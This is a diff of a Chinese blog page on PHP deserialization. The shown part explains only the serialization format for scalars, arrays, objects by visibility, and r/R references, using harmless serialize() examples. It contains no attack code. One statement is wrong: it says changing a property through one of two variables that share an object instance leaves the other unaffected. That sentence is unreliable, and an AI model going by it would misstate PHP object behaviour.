@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="PHP 测试：https:&#x2F;&#x2F;onlinephp.io&#x2F;  PHP 序列化格式基本数据类型基本数据类型的序列化格式只描述值，不包含变量名。 Null格式：N; 12$n &#x3D; null;$serialized &#x3D; serialize($n); &#x2F;&#x2F; 结果: N;  布尔值（Boolean）格式：b:&lt;value&gt;; 示例：b:1; 表示 true，b:0; 表示 false。 12$b">
+        <meta name="description" content="PHP 测试：https:&#x2F;&#x2F;onlinephp.io&#x2F;  PHP 序列化格式 基本数据类型 基本数据类型的序列化格式只描述值，不包含变量名。 Null 格式：N; 12$n &#x3D; null;$serialized &#x3D; serialize($n); &#x2F;&#x2F; 结果: N; 布尔值（Boolean） 格式：b:&lt;value&gt;; 示例：b:1; 表示 true，b:0; 表示">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP 反序列化">
 <meta property="og:url" content="https://skyi23.github.io/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="sky123">
-<meta property="og:description" content="PHP 测试：https:&#x2F;&#x2F;onlinephp.io&#x2F;  PHP 序列化格式基本数据类型基本数据类型的序列化格式只描述值，不包含变量名。 Null格式：N; 12$n &#x3D; null;$serialized &#x3D; serialize($n); &#x2F;&#x2F; 结果: N;  布尔值（Boolean）格式：b:&lt;value&gt;; 示例：b:1; 表示 true，b:0; 表示 false。 12$b">
+<meta property="og:description" content="PHP 测试：https:&#x2F;&#x2F;onlinephp.io&#x2F;  PHP 序列化格式 基本数据类型 基本数据类型的序列化格式只描述值，不包含变量名。 Null 格式：N; 12$n &#x3D; null;$serialized &#x3D; serialize($n); &#x2F;&#x2F; 结果: N; 布尔值（Boolean） 格式：b:&lt;value&gt;; 示例：b:1; 表示 true，b:0; 表示">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://skyi23.github.io/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/852087b5df10f2450fe7fbc04b8803c8.png">
 <meta property="og:image" content="https://skyi23.github.io/2024/11/11/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/images/bbb36b42e100789af36c3891acf3c20e.png">
@@ -316,182 +316,247 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>PHP 测试：<a class="link"   target="_blank" rel="noopener" href="https://onlinephp.io/" >https://onlinephp.io/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h1 id="PHP-序列化格式"><a href="#PHP-序列化格式" class="headerlink" title="PHP 序列化格式"></a>PHP 序列化格式</h1><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>基本数据类型的序列化格式只描述值，不包含变量名。</p>
-<h3 id="Null"><a href="#Null" class="headerlink" title="Null"></a>Null</h3><p><strong>格式</strong>：<code>N;</code></p>
+            <p>PHP 测试：<a class="link" 
+ target="_blank" rel="noopener" href="https://onlinephp.io/" >https://onlinephp.io/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h1 id="php-序列化格式">PHP 序列化格式</h1>
+<h2 id="基本数据类型">基本数据类型</h2>
+<p>基本数据类型的序列化格式只描述值，不包含变量名。</p>
+<h3 id="null">Null</h3>
+<p><strong>格式</strong>：<code>N;</code></p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$n</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$n</span>); <span class="comment">// 结果: N;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="布尔值（Boolean）"><a href="#布尔值（Boolean）" class="headerlink" title="布尔值（Boolean）"></a>布尔值（Boolean）</h3><p><strong>格式</strong>：<code>b:&lt;value&gt;;</code></p>
-<p><strong>示例</strong>：<code>b:1;</code> 表示 true，<code>b:0;</code> 表示 false。</p>
+<h3 id="布尔值boolean">布尔值（Boolean）</h3>
+<p><strong>格式</strong>：<code>b:&lt;value&gt;;</code></p>
+<p><strong>示例</strong>：<code>b:1;</code> 表示 true，<code>b:0;</code>
+表示 false。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>); <span class="comment">// 结果: b:1;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="整数（Integer）"><a href="#整数（Integer）" class="headerlink" title="整数（Integer）"></a>整数（Integer）</h3><p><strong>格式</strong>：<code>i:&lt;value&gt;;</code></p>
+<h3 id="整数integer">整数（Integer）</h3>
+<p><strong>格式</strong>：<code>i:&lt;value&gt;;</code></p>
 <ul>
-<li><p><code>&lt;value&gt;</code> 为一个整型数，范围为：-2147483648 到 2147483647。数字前可以有正负号。</p>
-</li>
-<li><p>如果被序列化的数字超过这个范围，则会被序列化为浮点数类型而不是整型。</p>
-</li>
-<li><p>如果序列化后的数字超过这个范围，则反序列化时，将不会返回期望的数值。</p>
-</li>
+<li><p><code>&lt;value&gt;</code> 为一个整型数，范围为：-2147483648 到
+2147483647。数字前可以有正负号。</p></li>
+<li><p>如果被序列化的数字超过这个范围，则会被序列化为浮点数类型而不是整型。</p></li>
+<li><p>如果序列化后的数字超过这个范围，则反序列化时，将不会返回期望的数值。</p></li>
 </ul>
 <p><strong>示例</strong>：<code>i:42;</code> 表示整数 42。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">42</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$i</span>); <span class="comment">// 结果: i:42;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="浮点数（Double）"><a href="#浮点数（Double）" class="headerlink" title="浮点数（Double）"></a>浮点数（Double）</h3><p><strong>格式</strong>：<code>d:&lt;value&gt;;</code></p>
+<h3 id="浮点数double">浮点数（Double）</h3>
+<p><strong>格式</strong>：<code>d:&lt;value&gt;;</code></p>
 <ul>
-<li><p><code>&lt;value&gt;</code> 为一个浮点数，其范围与 PHP 中浮点数的范围一致，可以表示成整数形式、浮点数形式和科学计数法形式。</p>
-</li>
-<li><p>如果序列化无穷大数，则 <code>&lt;value&gt;</code> 为 <code>INF</code>；如果序列化负无穷大数，则 <code>&lt;value&gt;</code> 为 <code>-INF</code>。</p>
-</li>
-<li><p>序列化后的数字范围超过 PHP 能表示的最大值，则反序列化时返回无穷大（<code>INF</code>）。</p>
-</li>
-<li><p>如果序列化后的数字范围低于 PHP 能表示的最小精度，则反序列化时返回 0。</p>
-</li>
-<li><p>当浮点数为非数（NaN）时，被序列化为 <code>NAN</code>。<code>NAN</code> 反序列化时返回 0，但其它语言可以将 <code>NAN</code> 反序列化为相应语言所支持的 <code>NaN</code> 表示。</p>
-</li>
+<li><p><code>&lt;value&gt;</code> 为一个浮点数，其范围与 PHP
+中浮点数的范围一致，可以表示成整数形式、浮点数形式和科学计数法形式。</p></li>
+<li><p>如果序列化无穷大数，则 <code>&lt;value&gt;</code> 为
+<code>INF</code>；如果序列化负无穷大数，则 <code>&lt;value&gt;</code> 为
+<code>-INF</code>。</p></li>
+<li><p>序列化后的数字范围超过 PHP
+能表示的最大值，则反序列化时返回无穷大（<code>INF</code>）。</p></li>
+<li><p>如果序列化后的数字范围低于 PHP 能表示的最小精度，则反序列化时返回
+0。</p></li>
+<li><p>当浮点数为非数（NaN）时，被序列化为
+<code>NAN</code>。<code>NAN</code> 反序列化时返回 0，但其它语言可以将
+<code>NAN</code> 反序列化为相应语言所支持的 <code>NaN</code>
+表示。</p></li>
 </ul>
 <p><strong>示例</strong>：<code>d:3.14;</code> 表示浮点数 3.14。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span> = <span class="number">3.14</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>); <span class="comment">// 结果: d:3.14;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="字符串（String）"><a href="#字符串（String）" class="headerlink" title="字符串（String）"></a>字符串（String）</h3><p><strong>格式</strong>：<code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;;</code></p>
+<h3 id="字符串string">字符串（String）</h3>
+<p><strong>格式</strong>：<code>s:&lt;length&gt;:"&lt;value&gt;";</code></p>
 <ul>
-<li><p><code>&lt;length&gt;</code> 是 <code>&lt;value&gt;</code> 的长度，<code>&lt;length&gt;</code> 是非负整数，数字前可以带有正号（<code>+</code>）。</p>
-</li>
-<li><p><code>&lt;value&gt;</code> 为字符串值，这里的每个字符都是单字节字符，其范围与 ASCII 码的 0 - 255 的字符相对应。</p>
-</li>
-<li><p>每个字符都表示原字符含义，没有转义字符，<code>&lt;value&gt;</code> 两边的引号（<code>&quot;</code>）是必须的，但不计算在 <code>&lt;length&gt;</code> 当中。</p>
-</li>
-<li><p><code>&lt;value&gt;</code> 相当于一个字节流，而 <code>&lt;length&gt;</code> 是这个字节流的字节个数。</p>
-</li>
+<li><p><code>&lt;length&gt;</code> 是 <code>&lt;value&gt;</code>
+的长度，<code>&lt;length&gt;</code>
+是非负整数，数字前可以带有正号（<code>+</code>）。</p></li>
+<li><p><code>&lt;value&gt;</code>
+为字符串值，这里的每个字符都是单字节字符，其范围与 ASCII 码的 0 - 255
+的字符相对应。</p></li>
+<li><p>每个字符都表示原字符含义，没有转义字符，<code>&lt;value&gt;</code>
+两边的引号（<code>"</code>）是必须的，但不计算在
+<code>&lt;length&gt;</code> 当中。</p></li>
+<li><p><code>&lt;value&gt;</code> 相当于一个字节流，而
+<code>&lt;length&gt;</code> 是这个字节流的字节个数。</p></li>
 </ul>
-<p><strong>示例</strong>：<code>s:5:&quot;Hello&quot;;</code> 表示字符串 “Hello”（长度为 5）。</p>
+<p><strong>示例</strong>：<code>s:5:"Hello";</code> 表示字符串
+"Hello"（长度为 5）。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>); <span class="comment">// 结果: s:5:&quot;Hello&quot;;</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="复杂数据类型"><a href="#复杂数据类型" class="headerlink" title="复杂数据类型"></a>复杂数据类型</h2><p>复杂数据类型的序列化格式包括键值对，键和值依次描述。键如果是索引则是数字，如果是属性则是字符串。</p>
-<h3 id="数组（Array）"><a href="#数组（Array）" class="headerlink" title="数组（Array）"></a>数组（Array）</h3><p><strong>格式</strong>：<code>a:&lt;length&gt;:&#123;&lt;key&gt;&lt;value&gt;...&#125;</code></p>
-<h4 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h4><p>索引数组的 <code>key</code> 就是索引对应的数字。</p>
+<h2 id="复杂数据类型">复杂数据类型</h2>
+<p>复杂数据类型的序列化格式包括键值对，键和值依次描述。键如果是索引则是数字，如果是属性则是字符串。</p>
+<h3 id="数组array">数组（Array）</h3>
+<p><strong>格式</strong>：<code>a:&lt;length&gt;:&#123;&lt;key&gt;&lt;value&gt;...&#125;</code></p>
+<h4 id="索引数组">索引数组</h4>
+<p>索引数组的 <code>key</code> 就是索引对应的数字。</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>); <span class="comment">// 结果: a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>, <span class="string">&quot;baz&quot;</span> =&gt; <span class="number">42</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>); <span class="comment">// 结果: a:2:&#123;s:3:&quot;foo&quot;;s:3:&quot;bar&quot;;s:3:&quot;baz&quot;;i:42;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="对象（Object）"><a href="#对象（Object）" class="headerlink" title="对象（Object）"></a>对象（Object）</h3><p><strong>格式</strong>：<code>O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;property_count&gt;:&#123;&lt;property_name&gt;&lt;property_value&gt;...&#125;</code></p>
+<h4 id="关联数组">关联数组</h4>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;foo&quot;</span> =&gt; <span class="string">&quot;bar&quot;</span>, <span class="string">&quot;baz&quot;</span> =&gt; <span class="number">42</span>);</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>); <span class="comment">// 结果: a:2:&#123;s:3:&quot;foo&quot;;s:3:&quot;bar&quot;;s:3:&quot;baz&quot;;i:42;&#125;</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="对象object">对象（Object）</h3>
+<p><strong>格式</strong>：<code>O:&lt;class_name_length&gt;:"&lt;class_name&gt;":&lt;property_count&gt;:&#123;&lt;property_name&gt;&lt;property_value&gt;...&#125;</code></p>
 <ul>
 <li><code>O</code> 是对象的标识符。</li>
 <li><code>&lt;class_name_length&gt;</code> 是类名的长度。</li>
 <li><code>&lt;class_name&gt;</code> 是类名。</li>
 <li><code>&lt;property_count&gt;</code> 是属性的个数。</li>
-<li><code>&#123;&lt;property_name&gt;&lt;property_value&gt;...&#125;</code> 是属性名和属性值的键值对。</li>
+<li><code>&#123;&lt;property_name&gt;&lt;property_value&gt;...&#125;</code>
+是属性名和属性值的键值对。</li>
 </ul>
-<h4 id="公有属性（Public-Properties）"><a href="#公有属性（Public-Properties）" class="headerlink" title="公有属性（Public Properties）"></a><strong>公有属性（Public Properties）</strong></h4><p>公有属性直接使用属性名，与关联数组类似，键就是属性名字符串的序列化结果。</p>
-<p><strong>格式</strong>： <code>s:&lt;length&gt;:&quot;&lt;property_name&gt;&quot;;&lt;property_value&gt;</code></p>
+<h4 id="公有属性public-properties"><strong>公有属性（Public
+Properties）</strong></h4>
+<p>公有属性直接使用属性名，与关联数组类似，键就是属性名字符串的序列化结果。</p>
+<p><strong>格式</strong>：
+<code>s:&lt;length&gt;:"&lt;property_name&gt;";&lt;property_value&gt;</code></p>
 <ul>
 <li><code>s</code> 是字符串的标识符。</li>
 <li><code>&lt;length&gt;</code> 是属性名的字符串长度。</li>
-<li><code>&quot;&lt;property_name&gt;&quot;</code> 是属性名，用双引号包裹。</li>
+<li><code>"&lt;property_name&gt;"</code> 是属性名，用双引号包裹。</li>
 <li><code>&lt;property_value&gt;</code> 是属性值。</li>
 </ul>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">// 结果: O:4:&quot;Test&quot;:1:&#123;s:3:&quot;var&quot;;s:5:&quot;Hello&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="受保护属性（Protected-Properties）"><a href="#受保护属性（Protected-Properties）" class="headerlink" title="受保护属性（Protected Properties）"></a><strong>受保护属性（Protected Properties）</strong></h4><p>受保护属性的属性名前加上一个 <code>*</code> 字符，用 null 字符（<code>\0</code>）分隔。</p>
-<p><strong>格式</strong>：<code>s:&lt;length&gt;:&quot;\0*\0&lt;property_name&gt;&quot;;&lt;property_value&gt;</code></p>
+<h4 id="受保护属性protected-properties"><strong>受保护属性（Protected
+Properties）</strong></h4>
+<p>受保护属性的属性名前加上一个 <code>*</code> 字符，用 null
+字符（<code>\0</code>）分隔。</p>
+<p><strong>格式</strong>：<code>s:&lt;length&gt;:"\0*\0&lt;property_name&gt;";&lt;property_value&gt;</code></p>
 <ul>
 <li><code>s</code> 是字符串的标识符。</li>
-<li><code>&lt;length&gt;</code> 是包含两个 null 字符、<code>*</code> 字符和属性名在内的字符串长度。</li>
-<li><code>&quot;\0*\0&lt;property_name&gt;&quot;</code> 是属性名，用两个 null 字符（<code>\0</code>）和一个 <code>*</code> 字符分隔。</li>
+<li><code>&lt;length&gt;</code> 是包含两个 null 字符、<code>*</code>
+字符和属性名在内的字符串长度。</li>
+<li><code>"\0*\0&lt;property_name&gt;"</code> 是属性名，用两个 null
+字符（<code>\0</code>）和一个 <code>*</code> 字符分隔。</li>
 <li><code>&lt;property_value&gt;</code> 是属性值。</li>
 </ul>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>); </span><br><span class="line"><span class="comment">// 结果: O:4:&quot;Test&quot;:1:&#123;s:8:&quot;\0*\0var&quot;;s:5:&quot;Hello&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="私有属性（Private-Properties）"><a href="#私有属性（Private-Properties）" class="headerlink" title="私有属性（Private Properties）"></a><strong>私有属性（Private Properties）</strong></h4><p>私有属性的属性名前加上类名，用 null 字符（<code>\0</code>）分隔。</p>
-<p><strong>格式</strong>：<code>s:&lt;length&gt;:&quot;\0&lt;class_name&gt;\0&lt;property_name&gt;&quot;;&lt;property_value&gt;</code></p>
+<h4 id="私有属性private-properties"><strong>私有属性（Private
+Properties）</strong></h4>
+<p>私有属性的属性名前加上类名，用 null 字符（<code>\0</code>）分隔。</p>
+<p><strong>格式</strong>：<code>s:&lt;length&gt;:"\0&lt;class_name&gt;\0&lt;property_name&gt;";&lt;property_value&gt;</code></p>
 <ul>
 <li><code>s</code> 是字符串的标识符。</li>
-<li><code>&lt;length&gt;</code> 是包含两个 null 字符、类名和属性名在内的字符串长度。</li>
-<li><code>&quot;\0&lt;class_name&gt;\0&lt;property_name&gt;&quot;</code> 是类名和属性名之间用两个 null 字符（<code>\0</code>）分隔。</li>
+<li><code>&lt;length&gt;</code> 是包含两个 null
+字符、类名和属性名在内的字符串长度。</li>
+<li><code>"\0&lt;class_name&gt;\0&lt;property_name&gt;"</code>
+是类名和属性名之间用两个 null 字符（<code>\0</code>）分隔。</li>
 <li><code>&lt;property_value&gt;</code> 是属性值。</li>
 </ul>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$serialized</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>); </span><br><span class="line"><span class="comment">// 结果: O:4:&quot;Test&quot;:1:&#123;s:9:&quot;\0Test\0var&quot;;s:5:&quot;Hello&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="嵌套复合类型"><a href="#嵌套复合类型" class="headerlink" title="嵌套复合类型"></a>嵌套复合类型</h2><p>PHP 的序列化机制能够处理复杂的嵌套复合类型，如自包含对象、相互引用的对象和数组。这些结构在序列化时会生成特定的标识符来记录引用关系，并在反序列化时正确恢复这些引用。</p>
-<h3 id="对象引用"><a href="#对象引用" class="headerlink" title="对象引用"></a>对象引用</h3><p>当对象被赋值给另一个变量时，<strong>两个变量都引用同一个对象实例）</strong>。这种引用在序列化时会被记录，并在反序列化时恢复。对象引用在序列化字符串中使用 <code>r</code> 标识。</p>
+<h2 id="嵌套复合类型">嵌套复合类型</h2>
+<p>PHP
+的序列化机制能够处理复杂的嵌套复合类型，如自包含对象、相互引用的对象和数组。这些结构在序列化时会生成特定的标识符来记录引用关系，并在反序列化时正确恢复这些引用。</p>
+<h3 id="对象引用">对象引用</h3>
+<p>当对象被赋值给另一个变量时，<strong>两个变量都引用同一个对象实例）</strong>。这种引用在序列化时会被记录，并在反序列化时恢复。对象引用在序列化字符串中使用
+<code>r</code> 标识。</p>
 <p>如果两个变量都引用同一个对象实例，我们修改一个变量对应的对象的属性不会影响另一个变量。</p>
 <ul>
 <li><strong>格式</strong>：<code>r:&lt;reference_number&gt;;</code></li>
-<li><strong>描述</strong>：<ul>
-<li><code>r</code> 用于表示对象引用。序列化过程中，当遇到重复的对象时，使用 <code>r</code> 来表示引用前面已经序列化的对象。</li>
-<li><code>&lt;reference_number&gt;</code> 是一个整数，表示引用的对象在序列化数据中的位置。位置从 1 开始计数。</li>
-</ul>
-</li>
+<li><strong>描述</strong>：
+<ul>
+<li><code>r</code>
+用于表示对象引用。序列化过程中，当遇到重复的对象时，使用 <code>r</code>
+来表示引用前面已经序列化的对象。</li>
+<li><code>&lt;reference_number&gt;</code>
+是一个整数，表示引用的对象在序列化数据中的位置。位置从 1 开始计数。</li>
+</ul></li>
 </ul>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;value = <span class="variable">$obj</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// 结果: O:4:&quot;Test&quot;:1:&#123;s:5:&quot;value&quot;;r:1;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="指针引用"><a href="#指针引用" class="headerlink" title="指针引用"></a>指针引用</h3><p>当使用 <code>&amp;</code> 符号明确指定引用传递时，<strong>两个变量共享同一个引用（类似两个指针的值始终同步，始终指向同一地址）</strong>。这种引用在序列化时会被记录为指针引用。指针引用在序列化字符串中使用 <code>R</code> 标识。</p>
+<h3 id="指针引用">指针引用</h3>
+<p>当使用 <code>&amp;</code>
+符号明确指定引用传递时，<strong>两个变量共享同一个引用（类似两个指针的值始终同步，始终指向同一地址）</strong>。这种引用在序列化时会被记录为指针引用。指针引用在序列化字符串中使用
+<code>R</code> 标识。</p>
 <p>如果两个变量共享同一个引用，那么我们修改一个变量对应的对象的属性时另一个变量会同步改变。</p>
 <ul>
 <li><strong>格式</strong>：<code>R:&lt;reference_number&gt;;</code></li>
-<li><strong>描述</strong>：<ul>
-<li><code>R</code> 用于表示指针引用。序列化过程中，当遇到使用 <code>&amp;</code> 符号明确指定的引用时，使用 <code>R</code> 来表示引用前面已经序列化的值或对象。</li>
-<li><code>&lt;reference_number&gt;</code> 是一个整数，表示引用的值或对象在序列化数据中的位置。位置从 1 开始计数。</li>
-</ul>
-</li>
+<li><strong>描述</strong>：
+<ul>
+<li><code>R</code> 用于表示指针引用。序列化过程中，当遇到使用
+<code>&amp;</code> 符号明确指定的引用时，使用 <code>R</code>
+来表示引用前面已经序列化的值或对象。</li>
+<li><code>&lt;reference_number&gt;</code>
+是一个整数，表示引用的值或对象在序列化数据中的位置。位置从 1
+开始计数。</li>
+</ul></li>
 </ul>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;value = &amp;<span class="variable">$obj</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// 结果: O:4:&quot;Test&quot;:1:&#123;s:5:&quot;value&quot;;R:1;&#125;</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="引用处理机制"><a href="#引用处理机制" class="headerlink" title="引用处理机制"></a>引用处理机制</h3><p>在 PHP 序列化过程中，PHP 会使用一个哈希表来跟踪已经被序列化的对象和引用。这个机制可以确保复杂的引用关系能够被正确处理并在反序列化时恢复。</p>
-<ol>
-<li><strong>建立空表</strong>：开始序列化时，PHP 会建立一个空的哈希表，用于记录已经被序列化的对象和引用。</li>
-<li><strong>计算 Hash 值</strong>：每个对象（以及对象中的属性的值）在被序列化之前，都会计算一个唯一的 Hash 值。</li>
-<li><strong>查表</strong>：检查这个 Hash 值是否已经在哈希表中：<ul>
+<h3 id="引用处理机制">引用处理机制</h3>
+<p>在 PHP 序列化过程中，PHP
+会使用一个哈希表来跟踪已经被序列化的对象和引用。这个机制可以确保复杂的引用关系能够被正确处理并在反序列化时恢复。</p>
+<ol type="1">
+<li><strong>建立空表</strong>：开始序列化时，PHP
+会建立一个空的哈希表，用于记录已经被序列化的对象和引用。</li>
+<li><strong>计算 Hash
+值</strong>：每个对象（以及对象中的属性的值）在被序列化之前，都会计算一个唯一的
+Hash 值。</li>
+<li><strong>查表</strong>：检查这个 Hash 值是否已经在哈希表中：
+<ul>
 <li>如果没有出现，则将 Hash 值添加到表中并返回添加成功。</li>
-<li>如果已经出现，则返回添加失败，同时返回该 Hash 值上一次出现的位置。</li>
-</ul>
-</li>
-<li><strong>判断引用类型</strong>：在返回添加失败之前，PHP 会判断该对象是否是一个引用（用 <code>&amp;</code> 符号定义的引用）：<ul>
-<li>如果是引用，则在添加 Hash 值到表中之后返回 <code>R</code> 标识。</li>
+<li>如果已经出现，则返回添加失败，同时返回该 Hash
+值上一次出现的位置。</li>
+</ul></li>
+<li><strong>判断引用类型</strong>：在返回添加失败之前，PHP
+会判断该对象是否是一个引用（用 <code>&amp;</code> 符号定义的引用）：
+<ul>
+<li>如果是引用，则在添加 Hash 值到表中之后返回 <code>R</code>
+标识。</li>
 <li>如果不是引用，则返回 <code>r</code> 标识。</li>
-</ul>
-</li>
+</ul></li>
 </ol>
-<p>例如下面随便举的一个例子：<br><img  
+<p>例如下面随便举的一个例子： <img 
+
                      lazyload
                      src="/images/loading.svg"
